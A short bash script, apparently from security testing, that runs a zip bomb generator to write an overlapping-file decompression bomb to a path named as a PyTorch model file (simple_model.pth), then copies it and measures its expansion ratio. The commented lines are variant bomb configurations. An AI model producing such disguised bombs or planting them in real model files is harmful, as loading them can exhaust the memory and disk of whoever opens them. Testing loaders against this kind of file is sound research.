#!/bin/bash
TARGET="../../pytorch/simple_model.pth"
TARGET2="../uncompress/simple_model.zip"
#python3 ../../zipbomb --mode=quoted_overlap --zip64 --template=template.zip --num-files=64 --compressed-size=$((1*1024*1024)) > "${TARGET}"
time python3 ../../zipbomb --mode=quoted_overlap --template=template.zip --num-files=256 --compressed-size=$((1*1024*1024)) > "${TARGET}"
#python3 ../../zipbomb --algorithm=bzip2 --mode=quoted_overlap --extra=10 --num-files=3 --compressed-size=$((1024*1+4+10)) > "${TARGET}"
cp "${TARGET}" "${TARGET2}"
ls -lhrt ${TARGET}
../../ratio ${TARGET}
